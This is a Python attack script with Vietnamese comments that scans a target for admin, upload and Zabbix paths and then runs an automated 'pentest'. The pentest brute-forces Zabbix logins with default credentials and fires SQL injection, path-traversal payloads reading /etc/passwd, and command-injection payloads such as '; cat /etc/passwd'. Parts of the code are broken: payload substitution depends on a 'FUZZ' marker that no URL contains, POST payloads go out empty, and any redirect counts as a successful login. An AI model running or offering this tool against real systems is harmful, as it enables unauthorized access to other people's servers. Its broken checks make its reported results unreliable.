import requests
import re
import itertools

# Danh s√°ch c√°c path ph·ªï bi·∫øn (g·ªìm c·∫£ upload & Zabbix)
COMMON_PATHS = [
    "/login.php", "/admin", "/user/login", "/auth", "/signin", "/dashboard", "/controlpanel",
    "/zabbix", "/zabbix/index.php", "/zabbix/setup.php", "/zabbix/api_jsonrpc.php",
    "/zabbix/zabbix.php?action=dashboard.view", "/zabbix/jsrpc.php",
    "/upload", "/file/upload", "/uploads", "/admin/upload", "/api/upload"
]

# Danh s√°ch t√†i kho·∫£n ph·ªï bi·∫øn ƒë·ªÉ brute-force Zabbix
COMMON_CREDENTIALS = [
    ("Admin", "zabbix"), ("zabbix", "zabbix"),
    ("admin", "admin"), ("administrator", "password"),
    ("root", "root"), ("test", "test")
]

def brute_force_zabbix_login(login_url):
    session = requests.Session()  # Gi·ªØ session ƒë·ªÉ tr√°nh redirect loop
    common_credentials = [
        ("Admin", "zabbix"),
        ("Admin", "admin"),
        ("zabbix", "zabbix"),
        ("admin", "admin"),
        ("administrator", "password"),
        ("root", "root"),
        ("test", "test"),
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    print(f"[+] Running brute-force on {login_url}")

    for username, password in common_credentials:
        print(f"[*] Trying {username}:{password}")  
        
        data = {
            "name": username,
            "password": password,
            "enter": "Sign in"
        }

        try:
            response = session.post(login_url, data=data, headers=headers, allow_redirects=False, timeout=5)

            if response.status_code in [301, 302]:  # N·∫øu b·ªã redirect
                redirect_url = response.headers.get("Location", "UNKNOWN")
                print(f"[!] Redirect detected to {redirect_url}")
            
            print(f"[DEBUG] {username}:{password} ‚Üí {response.status_code} {len(response.text)} bytes")  

            # N·∫øu ƒëƒÉng nh·∫≠p th√†nh c√¥ng
            if "Dashboard" in response.text or response.status_code == 302:
                print(f"[‚úî] Success: {username}:{password}")
                return True
        except requests.RequestException as e:
            print(f"[ERROR] {e}")

    print("[-] Brute-force failed.")
    return False

def exploit_zabbix(base_url):
    """Ch·∫°y pentest t·ª± ƒë·ªông khi ph√°t hi·ªán Zabbix"""
    print(f"[+] Detected Zabbix at {base_url}, running pentest...")

    # üõ°Ô∏è SQLi v√†o API ho·∫∑c Login
    sqli_payloads = ["' OR 1=1--", "' UNION SELECT null,version()--"]

    # üñ•Ô∏è LFI v√†o API JSON-RPC
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]

    # üè¥‚Äç‚ò†Ô∏è RCE (n·∫øu c√≥ ch·ª©c nƒÉng upload)
    rce_payloads = ["; ls", "; cat /etc/passwd", "; whoami"]

    # üõ†Ô∏è Brute-force tr∆∞·ªõc
    brute_force_zabbix_login(base_url)

    # üõ†Ô∏è Test SQLi, LFI, RCE
    test_payloads(base_url + "/api_jsonrpc.php", "POST", {}, sqli_payloads, "Zabbix SQLi")
    test_payloads(base_url + "/jsrpc.php", "GET", None, lfi_payloads, "Zabbix LFI")
    test_payloads(base_url + "/uploads", "GET", None, rce_payloads, "Zabbix RCE")

def scan_common_paths(base_url):
    """Qu√©t c√°c path ph·ªï bi·∫øn"""
    for path in COMMON_PATHS:
        full_url = base_url.rstrip("/") + path
        try:
            response = requests.get(full_url, timeout=5)
            if response.status_code == 200:
                print(f"[‚úî] Found: {full_url}")
                
                # üõ°Ô∏è N·∫øu ph√°t hi·ªán Zabbix, t·ª± ƒë·ªông ch·∫°y pentest
                if "zabbix" in path:
                    exploit_zabbix(full_url)
        except requests.RequestException:
            continue

def test_payloads(url, method, data, payloads, vuln_name):
    """Test payloads tr√™n URL m·ª•c ti√™u"""
    for payload in payloads:
        test_url = url.replace("FUZZ", payload)
        try:
            response = requests.get(test_url, timeout=5) if method == "GET" else requests.post(url, data={k: payload for k in data}, timeout=5)
            print(f"[*] Testing {vuln_name} payload: {payload}")
            if payload in response.text:
                print(f"[!!!] {vuln_name} Exploited: {test_url}")
        except requests.RequestException as e:
            print(f"[!] Error: {e}")

def run_pentest(base_url):
    common_paths = [
        "/zabbix", "/zabbix/index.php", "/zabbix/setup.php", "/zabbix/admin"
    ]

    for path in common_paths:
        url = f"{base_url}{path}"
        print(f"[‚úî] Found: {url}")
        if "zabbix" in url:
            print(f"[+] Detected Zabbix at {url}, running pentest...")
            brute_force_zabbix_login(url)

if __name__ == "__main__":
    target_url = input("Enter base URL: ")
    scan_common_paths(target_url)
